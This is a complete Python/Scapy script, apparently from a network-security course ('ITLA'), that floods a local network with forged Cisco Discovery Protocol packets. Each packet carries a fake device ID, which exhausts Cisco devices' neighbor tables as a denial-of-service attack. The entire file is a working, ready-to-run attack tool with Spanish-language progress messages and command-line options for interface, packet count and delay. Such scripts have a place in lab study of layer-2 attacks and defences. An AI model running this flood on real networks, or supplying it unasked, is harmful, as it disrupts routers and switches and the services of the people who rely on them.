#!/usr/bin/env python3
from scapy.all import *
from scapy.contrib.cdp import *
import argparse
import sys
import os

def create_cdp_packet(device_id):
    eth = Ether(dst="01:00:0c:cc:cc:cc")
    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    snap = SNAP(OUI=0x00000c, code=0x2000)
    cdp_hdr = CDPv2_HDR(vers=2, ttl=180)
    
    cdp_tlvs = CDPMsgDeviceID(val=device_id.encode())
    cdp_tlvs /= CDPMsgAddr(naddr=1, addr=CDPAddrRecordIPv4(addr="10.21.23.2"))
    cdp_tlvs /= CDPMsgPortID(iface=b"Ethernet0/1")
    cdp_tlvs /= CDPMsgCapabilities(cap=0x00000029)
    cdp_tlvs /= CDPMsgSoftwareVersion(val=b"Cisco IOS")
    cdp_tlvs /= CDPMsgPlatform(val=b"Cisco Router")
    
    return eth / llc / snap / cdp_hdr / cdp_tlvs

def attack(interface, count, delay):
    print(f"[*] Iniciando ataque CDP DoS")
    print(f"[*] Interfaz: {interface}")
    print(f"[*] Paquetes: {count}")
    print(f"[*] Delay: {delay}s\n")
    
    try:
        for i in range(count):
            device_id = f"FAKE-DEVICE-{i:05d}"
            packet = create_cdp_packet(device_id)
            sendp(packet, iface=interface, verbose=False)
            
            if (i + 1) % 100 == 0:
                print(f"[+] Paquetes enviados: {i + 1}")
            
            time.sleep(delay)
        
        print(f"\n[*] Ataque completado: {count} paquetes enviados")
        
    except KeyboardInterrupt:
        print(f"\n[!] Ataque interrumpido")
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CDP DoS Attack - ITLA')
    parser.add_argument('-i', '--interface', required=True, help='Interfaz de red')
    parser.add_argument('-c', '--count', type=int, default=1000, help='Cantidad de paquetes')
    parser.add_argument('-d', '--delay', type=float, default=0.001, help='Delay entre paquetes')
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[!] Requiere privilegios root")
        sys.exit(1)
    
    attack(args.interface, args.count, args.delay)